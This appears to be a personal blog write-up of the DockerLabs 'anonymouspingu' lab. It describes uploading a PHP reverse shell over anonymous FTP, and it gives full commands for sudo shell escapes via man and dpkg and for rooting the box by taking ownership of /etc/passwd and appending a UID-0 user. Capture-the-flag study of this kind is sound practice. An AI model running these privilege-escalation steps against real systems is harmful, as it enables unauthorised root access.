---
layout: post
title: "anonymouspingu - dockerlabs"
date: 2024-10-28 06:25:00 -0400
categories:
    - posts
tags:
    - Road2OSCP
    - CTF
    - en
---

# anonymouspingu [dockerlabs]

- 
- We enumerate, and see HTTP and FTP with anonymous access.
- We upload a reverse shell to a directory we can see from the page, called "upload."
- We had some issues here because we tried to upload a JS reverse shell; in the end, we tested a typical one in PHP.
- We have access as the user www-data.
- `sudo -l` shows that we can execute commands as the user pingu.
- 

```bash
www-data@7e5ed41e0051:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on 7e5ed41e0051:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on 7e5ed41e0051:
    (pingu) NOPASSWD: /usr/bin/man

```

Here we struggled a lot; the issue is the interpretation of `sudo -l`, which I’ll cover later, but basically, we can say that we ran `man` as pingu.

- We tested linpease, pspy64, SUID permissions, and more... we went around in circles.
- We ended up relying on the write-up.

```bash
www-data@7e5ed41e0051:/var/www/html/upload$ sudo -u pingu /usr/bin/man man

```

In this context, the result of `sudo -l` indicates that the user www-data can execute the `man` command as the user pingu without needing to enter a password (NOPASSWD). This is detailed in the line:

```
(pingu) NOPASSWD: /usr/bin/man

```

This permission means that `www-data` can execute `/usr/bin/man` with the privileges of the user `pingu` using `sudo`. Taking advantage of this, you can start a shell as the user `pingu` in the following way:

1. **Run the `man` command with sudo**: Execute the following command to open the `man` manual with `pingu`'s permissions:

```bash
sudo -u pingu /usr/bin/man man
```

Accessing a Shell from man: Once inside the man manual, you can invoke a shell by typing `!bash` or `!sh` (the `!` symbol allows you to execute commands in most man viewers). This will execute a shell with the privileges of pingu:

```
code

```

## pivot 2

[https://gtfobins.github.io/gtfobins/dpkg/](https://gtfobins.github.io/gtfobins/dpkg/)

```bash
$ sudo -l
Matching Defaults entries for pingu on 7e5ed41e0051:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pingu may run the following commands on 7e5ed41e0051:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
    
    pingu@7e5ed41e0051:~$ sudo -u gladys /usr/bin/dpkg -l
    !/bin/sh

```

## pivot3

```bash
$ sudo -l
Matching Defaults entries for gladys on 7e5ed41e0051:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User gladys may run the following commands on 7e5ed41e0051:
    (root) NOPASSWD: /usr/bin/chown

```

Here we also struggled a bit; I’m relying on the write-up because I have to work.

Looking back now, we weren’t focused on understanding that we can use `chown` to change permissions; we got confused with gtfobins.

But basically, the pivot involves changing the permissions of `/etc/passwd` and then adding a user there.

```bash
gladys@7e5ed41e0051:~$ openssl passwd yourpass
$1$y9dM3R07$YVeHg7gGK1VvSBof81nEw.
gladys@7e5ed41e0051:~$ sudo /usr/bin/chown gladys. /etc/passwd
gladys@7e5ed41e0051:~$ echo 'privesc:$1$y9dM3R07$YVeHg7gGK1VvSBof81nEw.:0:0::/home/privesc:/bin/bash' >> /etc/passwd
gladys@7e5ed41e0051:~$ su privesc
Password:                                                                                                                                           
root@7e5ed41e0051:/home/gladys#         
```

Note: The confusion and what I was trying to do without sense was:

Creating a reverse shell, but of course, I didn’t take into account that `chown` changes permissions... lesson learnt.